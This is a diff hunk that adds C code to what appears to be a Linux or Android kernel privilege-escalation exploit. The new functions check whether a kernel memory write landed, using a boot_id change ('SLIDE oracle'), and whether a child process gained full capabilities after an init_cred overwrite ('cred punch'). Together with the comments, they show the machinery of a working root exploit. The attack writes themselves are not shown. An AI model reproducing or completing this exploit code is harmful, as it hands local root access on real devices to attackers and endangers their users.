@@ -32,6 +32,50 @@ uintptr_t binwrite_target;
  * configfs_read_once arms .read around each pread so system read()
  * traffic never sees the configfs read JT. */
 int g_swap_staged;
+long g_uid0_child_pid;
+char g_bootid_before[80];
+
+/* Landing signal for the SLIDE oracle: boot_id changes iff the
+ * *ctl_table.data = P0(nfulnl_logger) store landed. */
+int bootid_changed(void) {
+  char now[80] = {0};
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
+  if (fd < 0)
+    return 0;
+  ssize_t n = read(fd, now, sizeof(now) - 1);
+  close(fd);
+  if (n <= 0)
+    return 0;
+  now[n] = 0;
+  for (int i = 0; now[i]; i++)
+    if (now[i] == '\n')
+      now[i] = 0;
+  return g_bootid_before[0] && strcmp(now, g_bootid_before) != 0;
+}
+volatile int g_uid0_cred_landed;
+
+/* Landing signal for the cred punch: /proc/<child>/status CapEff comes from
+ * the SUBJECTIVE cred — a landed init_cred store flips it from all-zero to
+ * full caps even while the child pipe is wedged. */
+int uid0_child_capeff_landed(void) {
+  if (g_uid0_child_pid <= 0)
+    return 0;
+  char path[64];
+  snprintf(path, sizeof(path), "/proc/%ld/status", g_uid0_child_pid);
+  int fd = open(path, O_RDONLY);
+  if (fd < 0)
+    return 0;
+  char buf[4096] = {0};
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0)
+    return 0;
+  char *ce = strstr(buf, "CapEff:");
+  if (!ce)
+    return 0;
+  unsigned long long v = strtoull(ce + 7, NULL, 16);
+  return v != 0ULL;
+}
 char ashmem_path[256] = "/dev/ashmem";
 
 /* 2-write support */
